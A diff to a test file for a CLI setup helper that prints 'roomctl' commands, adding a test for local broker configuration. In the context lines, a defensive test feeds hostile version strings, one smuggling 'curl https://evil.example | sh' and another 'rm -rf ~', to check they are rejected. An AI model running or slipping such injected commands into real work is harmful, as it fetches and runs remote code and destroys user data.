@@ -138,6 +138,16 @@ describe("cliSetup", () => {
     ].join("\n"));
     expect(get).toHaveBeenCalledWith("/api/roomctl", expect.anything());
   });
+  it("a local broker: configure by URL alone, no login, then roomctl run", async () => {
+    const { text } = await open({ url: "http://localhost:8080", issuer: "", clientID: "local", projectID: "local", version: "dev", humanMode: "local" });
+    const lines = text.split("\n");
+    expect(lines.slice(-2)).toEqual([
+      "roomctl configure --url http://localhost:8080",
+      "roomctl run --repo <owner/name> --task '<what the run should do>'",
+    ]);
+    expect(text).not.toContain("--client-id");
+    expect(text).not.toContain("roomctl login");
+  });
   it("installs the latest release when the version is not a whole release semver, hostile ones included", async () => {
     for (const version of ["dev", undefined, `v1"; curl https://evil.example | sh #`, "v1.2.3\nrm -rf ~"]) {
       const { text } = await open({ ...values, version });
